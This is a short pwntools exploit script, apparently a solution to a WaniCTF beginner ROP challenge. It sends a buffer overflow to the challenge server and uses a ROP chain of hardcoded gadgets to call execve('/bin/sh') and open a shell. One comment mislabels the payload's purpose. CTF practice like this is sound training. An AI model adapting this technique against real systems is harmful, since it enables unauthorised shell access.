#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

local = False
if(local):
    io = process(exe)
else:
    io = remote('beginners-rop-pwn.wanictf.org', 9005)

# =========================================================
#                         ADDRESSES
# =========================================================
pop_rax = 0x401371
xor_rsi = 0x40137e
xor_rdx = 0x40138d
mov_rsp_rdi_pop_ret = 0x40139c
bss = elf.bss()
syscall = 0x4013af

# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 40

# flattening  payload here
# execve("/bin/sh", 0, 0)
payload = flat({
    offset: [
        xor_rdx,
        xor_rsi,
        pop_rax, 0x3b,
        mov_rsp_rdi_pop_ret, 
        '/bin/sh\x00',
        syscall
    ]
})

# send payload to get puts offset
io.sendlineafter(b'your input (max. 96 bytes) > ', payload)

io.interactive()